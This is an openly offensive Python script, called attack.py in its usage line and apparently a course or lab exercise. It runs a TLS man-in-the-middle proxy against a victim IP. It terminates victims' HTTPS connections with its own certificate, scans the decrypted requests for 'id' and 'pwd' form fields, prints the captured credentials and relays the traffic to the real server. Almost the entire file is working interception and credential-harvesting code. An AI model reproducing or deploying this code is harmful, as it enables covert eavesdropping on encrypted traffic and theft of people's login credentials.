#!/usr/bin/env python3
import os
import subprocess
import sys
import time
import re
import threading
import ssl
import socket
import multiprocessing
from multiprocessing import Manager
import selectors
from datetime import datetime


# Configurations
VICTIM_IP = sys.argv[1]  # IP address of the victim machine passed as an argument
INTERFACE = sys.argv[2]  # Network interface to use for ARP spoofing passed as an argument
stop_threads = False  # 全局標誌來控制執行緒是否應該停止

# SSL configurations
CERTIFICATE_FILE = "certificates/host.crt"  # Path to the SSL certificate file
PRIVATE_KEY_FILE = "certificates/host.key"  # Path to the private key file
TARGET_SERVER_PORT = 443  # Standard HTTPS port

manager = Manager()
tls_printed_list = manager.list()  # 用於跟蹤已經打印過的連接
credentials_list = manager.list()

# Function to extract target server IP from client request
def extract_target_ip(data):
    global tls_printed_list
    try:
        # Extract the Host header from the HTTP request to determine the target server IP
        match = re.search(r'Host: ([\w\.-]+)', data.decode('utf-8', errors='ignore'))
        if match:
            IP = socket.gethostbyname(match.group(1))
            if IP not in tls_printed_list:
            	print(f"TLS Connection Established: [{IP}:{TARGET_SERVER_PORT}]")
            	tls_printed_list.append(IP)
            return match.group(1)
    except Exception as e:
        print(f"[!] Error extracting target IP: {e}")
    return None

# Function to set up SSL/TLS socket for TLS connection hijacking
def setup_ssl_socket():
    try:
        # Create an SSL context for server-side usage
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # Load the certificate and private key for the server
        context.load_cert_chain(certfile=CERTIFICATE_FILE, keyfile=PRIVATE_KEY_FILE)

        # Create a TCP socket and bind it to all interfaces on port 8080
        bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set socket options to reuse address
        bindsocket.bind(("0.0.0.0", 8080))  # Bind to all available interfaces on port 8080
        bindsocket.listen(5)  # Listen for incoming connections, with a backlog of 5
        

        # Accept and handle incoming connections
        while not stop_threads:
            newsocket, fromaddr = bindsocket.accept()  # Accept a new connection
            # Fork a new process to handle the connection
            process = multiprocessing.Process(target=handle_connection, args=(newsocket, context))
            process.start()
            newsocket.close()  # Close the raw socket in the parent process

    except Exception as e:
        print(f"[!] Error setting up SSL socket: {e}")  # Handle errors during socket setup
        sys.exit(1)

# Function to handle client connections in a separate process
def handle_connection(newsocket, context):
    try:
        # Wrap the socket with SSL to establish a secure connection
        conn = context.wrap_socket(newsocket, server_side=True)
        handle_client(conn)  # Handle the client's connection
    except ssl.SSLError as e:
        print(f"[!] SSL error: {e}")  # Handle SSL-specific errors
    except Exception as e:
        print(f"[!] Error handling client: {e}")  # Handle other exceptions
    finally:
        newsocket.close()  # Close the raw socket after handling the connection

# Function to handle client connections using selectors
def handle_client(conn):
    global credentials_list
    try:
        credentials_pattern = re.compile(r'id=([^\&]+)&pwd=([^\&]+)')
        
        selector = selectors.DefaultSelector()
        selector.register(conn, selectors.EVENT_READ)
        # Wait for the client to send data
        events = selector.select(timeout=3.0)  # 3 seconds timeout
        while True:
            for key, mask in events:
                if mask & selectors.EVENT_READ:
                    data = key.fileobj.recv(8192)
                    if data:
                        # Decode received data as UTF-8 while ignoring errors
                        decoded_data = data.decode('utf-8', errors='ignore')
                        #print(f"[+] Received data: {data}")
                        #print(f"[+] Received data: {decoded_data}")
                        match = credentials_pattern.search(decoded_data)
                        if match:
                            user_id = match.group(1).strip()
                            password = match.group(2).strip()
                            credentials_tuple = (user_id, password)
                            
                            if user_id.isdigit() and password.isdigit() and (credentials_tuple not in credentials_list):
                                print(f"id = {user_id}, pwd = {password}")
                                credentials_list.append(credentials_tuple)

                        # Extract the target server IP from the client's request
                        target_ip = extract_target_ip(data) # hostname
                        if target_ip:
                            old_ip = target_ip
                        if old_ip:
                            target_ip = old_ip
                            
                        if target_ip:
                            ip = socket.gethostbyname(target_ip)
                            # Forward the request to the target server and get the response
                            #print(f"IP:{target_ip}")
                            #print("Forward the request to the target server")
                            target_response = forward_to_server(data, target_ip, conn)
                            old_ip = target_ip
                        else:
                            print("[!] Unable to determine target IP from client request")
                    else:
                        print("[!] No data received from client")  # No data was received from the client
    except socket.timeout:
        #print("[!] Timeout while waiting for data from client")  # Handle timeout error
        pass
    except Exception as e:
        print(f"[!] Error reading data from client: {e}")  # Handle errors during data reception
    finally:
        selector.unregister(conn)
        conn.close()  # Close the connection

# Function to forward data to the target server and get the response
def forward_to_server(data, target_ip, conn):
    try:
        # Create a socket to connect to the target server
        with socket.create_connection((target_ip, TARGET_SERVER_PORT)) as sock:
            # Wrap the socket with SSL to establish a secure connection
            with ssl.create_default_context().wrap_socket(sock, server_hostname=target_ip) as ssock:
                # Send the data to the target server
                #print("send0")
                ssock.sendall(data)
                #print("send1")
                #print(f"[+] Forwarded data to target server {target_ip}:{TARGET_SERVER_PORT}")
                ssock.settimeout(3)
                #print("send2")
                # Receive the response from the target server in chunks
                response = b""
                while True:
                    #print("send3")
                    try:
                        part = ssock.recv(8192)
                    except socket.timeout:
                        #print("[!] Timeout while waiting for response from target server")
                        break
                    #print("send4")
                    
                    if not part:
                        #print("send5")
                        break
                    conn.sendall(part)
                    response += part
                #print("send6")
                #print(f"[+] Received response from target server")
                if not part:
                    print("[!] No response received from target server")
                else:
                    print("[+] Response forwarded to client")
                return response
    except Exception as e:
        #print(f"[!] Error forwarding data to target server: {e}")
        return None

# Main function
def main():
    if len(sys.argv) != 3:
        print("Usage: sudo attack.py <VICTIM_IP> <INTERFACE>")
        sys.exit(1)

    print("[DEBUG] Starting main function")

    setup_ssl_socket()  # Set up to hijack TLS connections
    


if __name__ == "__main__":
    print("[DEBUG] Starting program")
    main()

